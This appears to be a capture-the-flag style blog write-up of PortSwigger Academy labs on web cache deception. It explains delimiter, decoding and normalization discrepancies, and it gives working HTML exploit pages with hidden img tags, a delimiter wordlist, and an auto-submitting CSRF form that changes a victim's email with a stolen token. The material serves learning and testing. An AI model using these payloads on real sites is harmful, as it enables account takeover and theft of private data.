---
title: Portswigger (Web Cache Deception)
date: 2026-8-12 13:10:30 +0000
categories: [Portswigger]
tags: [Portswigger]
math: true
mermaid: true
media_subpath: /assets/posts/portswigger
image:
  path: preview.png
---
--------------

### Web Cache Deception

--------------

- Web cache deception is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content. It's caused by discrepancies between how the cache server and origin server handle requests.In a web cache deception attack, an attacker persuades a victim to visit a malicious URL, inducing the victim's browser to make an ambiguous request for sensitive content. The cache misinterprets this as a request for a static resource and stores the response. The attacker can then request the same URL to access the cached response, gaining unauthorized access to private information.

- Constructing a Web Cache Deception Attack-:
- Focus on http verbs like `GET`,`HEAD` OR `OPTIONS` as objects that alter state are not always cached.
- Discrepancies in how the path is processed by the cache and origin server e.g
 - Map URLs to resources.
 - Process delimiter characters.
 - Normalize paths.

- Craft a malicious URL that uses the discrepancy to trick the cache into storing a dynamic response. When the victim accesses the URL, their response is stored in the cache. Using Burp, you can then send a request to the same URL to fetch the cached response containing the victim's data.

- Always add a cache buster->
> As both URL path and any query parameters are typically included in the cache key, you can change the key by adding a query string to the path and changing it each time you send a request. Automate this process using the Param Miner extension. To do this, once you've installed the extension, click on the top-level Param miner > Settings menu, then select Add dynamic cachebuster. Burp now adds a unique query string to every request that you make. You can view the added query strings in the Logger tab.

- Detecting Cache responses-:
 -  The X-Cache header provides information about whether a response was served from the cache. Typical values include:
 -  X-Cache: hit - The response was served from the cache.
 -  X-Cache: miss - The cache did not contain a response for the request's key, so it was fetched from the origin server. In most cases, the response is then cached. To confirm this, send the request again to see whether the value updates to hit.
 -  X-Cache: dynamic - The origin server dynamically generated the content. Generally this means the response is not suitable for caching.
 -  X-Cache: refresh - The cached content was outdated and needed to be refreshed or revalidated.

- Exploiting Static extension cache rule-:
 - Cache rules often target static resources by matching common file extensions like .css or .js. This is the default behavior in most CDNs.

- URL path mapping is the process of associating URL paths with resources on a server, such as files, scripts, or command executions. There are a range of different mapping styles used by different frameworks and technologies. Two common styles are traditional URL mapping and RESTful URL mapping.

-----------------

### Challenge-: Exploiting path mapping for web cache deception

-----------------

-  Traditional mapping is in use and we notice that `.css` gets cached since we receive the `X-Cache: miss` header in our response.

  <img width="628" height="135" alt="image" src="https://github.com/user-attachments/assets/58f0c4cc-7c2d-45ca-95bb-05c516ba71cf" />

- Normalizing it by ending with `my-account/index.css?x=y` and using a cache buster which returns the page and exposes the url discrepancy-:

<img width="731" height="162" alt="image" src="https://github.com/user-attachments/assets/d339ca26-5c26-44e1-9243-8d58f584d8e2" />

- Exploiting carlos with csrf html payload,don't forget our cache buster-:

```html
<! doctype html>
<html>
<img src="https://0ab1008c04140d638237339a00f200c8.web-security-academy.net/my-account/index.css?cache=busted" width="0" height="0" />
</html>
```
- Hit -:

<img width="778" height="112" alt="image" src="https://github.com/user-attachments/assets/85e6b412-a48e-4500-8bdd-f2822b0217ed" />

--------------

### Delimeter Discrepancies

--------------

- Discrepancies in how the cache and origin server use characters and strings as delimiters can result in web cache deception vulnerabilities. Consider the example `/profile;foo.css`
- E.g
  - The Java Spring framework uses the ; character to add parameters known as matrix variables. An origin server that uses Java Spring would therefore interpret ; as a delimiter. It truncates the path after /profile and returns profile information.
  -  The Ruby on Rails framework uses `.` as a delimiter to specify the response format:
  -  This request uses the .ico extension, which isn't recognized by Ruby on Rails. The default HTML formatter handles the request and returns the user profile information. In this situation, if the cache is configured to store responses for requests ending in .ico, it would cache and serve the profile information as if it were a static file.
  -  The OpenLiteSpeed server uses the encoded null %00 character as a delimiter. An origin server that uses OpenLiteSpeed would therefore interpret the path as /profile.
-  Exploiting Delimeter Discrepancies-:
>Some delimiter characters may be processed by the victim's browser before it forwards the request to the cache. This means that some delimiters can't be used in an exploit. For example, browsers URL-encode characters like {, }, <, and >, and use # to truncate the path.If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit.
--------------

### Chall 2-: Exploiting path delimiters for web cache deception

--------------

-  Delimiter discrepancies-:

```
/my-account;index.ico?x=y
```

- Exploit-:

```html
<! doctype html>
<html>
<img src="https://0ab0003103cea50c82e1b5cb006700ed.web-security-academy.net/my-account;index.ico?fooz=bar" width="0" height="0" />
</html>
```

- Hit-:

<img width="775" height="265" alt="image" src="https://github.com/user-attachments/assets/6d4aca2c-5fc1-4747-828a-91104f632a04" />


--------------

### Delimeter Decoding Discrepancies

---------------

- Let's take this into consideration e.g `/profile%23wcd.css` which decodes to `#`
- Cache sees it plainly as `/profile%23wcd.css` and caches it but the origin server decodes it and sees it as a discrepamcy

- Some cache servers may decode the URL and then forward the request with the decoded characters. Others first apply cache rules based on the encoded URL, then decode the URL and forward it to the next server. These behaviors can also result in discrepancies in the way cache and origin server interpret the URL path. Consider the example `/myaccount%3fwcd.css`:
 - It checks the urlencoded one , apply cache rules and sends it to the origin server
 - Which sees it as a normal url and returns the profile

--------------

### Exploiting static directory cache rules

---------------

- It's common practice for web servers to store static resources in specific directories. Cache rules often target these directories by matching specific URL path prefixes, like /static, /assets, /scripts, or /images. These rules can also be vulnerable to web cache deception.
- Discrepancies in how the cache and origin server normalize the URL can enable an attacker to construct a path traversal payload that is interpreted differently by each parser. Consider the example `/static/..%2fprofile`:
- Cache server might not decode it , apply cache rules and also return it to the Origin server leading to cache deception

--------------

### Challenge:  Exploiting origin server normalization for web cache deception

---------------

- Caching is a based on static assets storage `/resources/`-:

```
/resources/..%2fmy-account
```

- Exploit-:

```html
<! doctype html>
<html>
<img src="https://0a3d005204fb5c738344fc6f003b00b2.web-security-academy.net/resources/..%2fmy-account?foo=bar" width="0" height="0" />
</html>
```

- Hit-:

<img width="767" height="181" alt="image" src="https://github.com/user-attachments/assets/0e436064-0a59-4f06-b912-6f7fc636ac2c" />

----------

### Exploiting normalization by the cache server

----------

- If the cache server resolves encoded dot-segments but the origin server doesn't, you can attempt to exploit the discrepancy by constructing a payload according to the following structure:

```
/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
```

- In this situation, path traversal alone isn't sufficient for an exploit. For example, consider how the cache and origin server interpret the payload `/profile%2f%2e%2e%2fstatic`:
- The cache interprets the path as: `/static` because it url decodes it
- The origin server interprets the path as: `/profile%2f%2e%2e%2fstatic`

- Always find a delimiter e.g
- For example, consider the payload `/profile;%2f%2e%2e%2fstatic`. The origin server uses `;` as a delimiter:

- The cache interprets the path as: /static
- The origin server interprets the path as: /profile
 
-----------------

### Challenge-:  Exploiting cache server normalization for web cache deception

-----------------

- The cache server decodes and normalizes the url, leaving `/resources` only but the delimeter pops up because the origin-server decodes `#`-:

```
/my-account%23%2f%2e%2e%2fresources?x=y
```

- Exploit-:

```html
<! doctype html>
<html>
<img src="https://0a0b00bb037199bf8098120f00cc00fa.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?foo=y" width="0" height="0" />
</html>
```
- Hit-:

<img width="772" height="289" alt="image" src="https://github.com/user-attachments/assets/efa1b2a6-4329-4e19-8830-ba461a497a78" />

----------------

### Exploiting file name cache rules

----------------

- Certain files such as robots.txt, index.html, and favicon.ico are common files found on web servers. They're often cached due to their infrequent changes. Cache rules target these files by matching the exact file name string.
- To identify whether there is a file name cache rule, send a GET request for a possible file and see if the response is cached.
- To test how the cache normalizes the URL path, send a request with a path traversal sequence and an arbitrary directory before the file name. For example, /profile%2f%2e%2e%2findex.html:
- If the response is cached, this indicates that the cache normalizes the path to `/index.html`.
- If the response isn't cached, this indicates that the cache doesn't decode the slash and resolve the dot-segment, interpreting the path as `/profile%2f%2e%2e%2findex.html`.

--------------

### Challenge-: Exploiting exact-match cache rules for web cache deception

---------------

- Delimeter's wordlist->

```text
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
%21
%22
%23
%24
%25
%26
%27
%28
%29
%2A
%2B
%2C
%2D
%2E
%2F
%3A
%3B
%3C
%3D
%3E
%3F
%40
%5B
%5C
%5D
%5E
%5F
%60
%7B
%7C
%7D
%7E
```

- Normalization requires the `cache file` key and also the static resources directory plus a delimeter.See-:

```url
/my-account;%2f%2e%2e%2fresources%2f%2e%2e%2frobots.txt
```

- Exploit-:

```html
<! doctype html>
<html>
<img src="https://0acc00430356efd28006038d00d9002c.web-security-academy.net/my-account;%2f%2e%2e%2fresources%2f%2e%2e%2frobots.txt?cache=buster" width="0" height="0" />
</html>
```

- CSRF-token stolen, post based CSRF-:

```html
<html>
  <body>
    <form action="https://0acc00430356efd28006038d00d9002c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker-controlled@email.com">
      <input type="hidden" name="csrf" value="JxVei2N6sWi4VwvX1p7dVyqbxA2TDFPj">
    </form>
    
    <script>
      // Automatically submits the form as soon as the page loads
      document.forms[0].submit();
    </script>
  </body>
</html>
```
